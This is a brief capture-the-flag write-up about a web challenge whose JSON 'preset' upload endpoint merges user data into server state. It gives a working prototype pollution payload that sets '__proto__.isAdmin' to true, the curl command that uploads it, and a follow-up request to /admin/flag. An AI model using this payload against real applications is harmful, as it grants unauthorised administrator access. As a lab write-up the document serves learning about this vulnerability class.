# General Idea
For this one i stared at the page code for like 10 minutes and and got absolutely nothing. Then i decided to take a look in the handout folder provided
and found out that the server checks for a "isAdmin" property on the user object.
I tried to map how the frontend and the API talked to each other and noticed three useful clues in the repo/handout:

1. There’s an upload endpoint for “presets”/themes that accepts JSON.

2. After upload the server prints back a merged object in the response — which screamed “this service merges user data into server state”.

3. Admin-only routes simply check user.isAdmin (classic, short, and sweet).

## Exploit
Using the following payload: 
`{
  "anything": {
    "__proto__": { "isAdmin": true }
  }
}
` 
and this curl command `curl -s -b cookie.txt -F 'preset=@payload.json;type=application/json' "$HOST/api/preset/upload"
` returns a response that included `merged{...}` which indicated it actually merged our data into its server-side object.
After that I was able to get the flag making a request to /admin/flag.

